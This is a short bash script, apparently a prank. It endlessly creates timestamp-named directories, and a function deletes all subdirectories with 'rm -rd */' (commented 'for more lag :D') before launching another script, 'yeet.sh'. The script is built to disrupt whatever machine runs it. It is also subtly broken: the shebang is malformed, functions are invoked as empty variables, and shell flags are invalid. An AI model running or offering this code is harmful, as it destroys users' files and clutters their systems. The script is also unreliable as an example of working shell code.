#!bin/bash
timeout() {

    time=$1

    # start the command in a subshell to avoid problem with pipes
    # (spawn accepts one command)
    command="/bin/sh -c \"$2\""

    expect -c "set echo \"-noecho\"; set timeout $time; spawn -noecho $command; expect timeout { exit 1 } eof { exit 0 }"    

    if [ $? = 1 ] ; then
        echo "Timeout after ${time} seconds"
    fi

}
reset="\e[m"
dark_blue="\e[38;5;21m"
killfiles(){
  rm -rd */ #for more lag :D
  echo -e "$dark_blue"
  $timeout 10 "bash yeet.sh"
}
set +EX
while true
do
  x=$(date +%S-%N)
  if [ -d $HOME/$x ]
  then
    set -EX
    cd $x
    mkdir $x || exit 2
    cd ../
    echo -e "$dark_blue $HOME/$x/$x/ $reset"
    set +EX
  fi
  echo -e "$dark_blue $HOME/$x/ $reset"
  $timeout 5 "mkdir $x" || $killfiles && set -EX
done
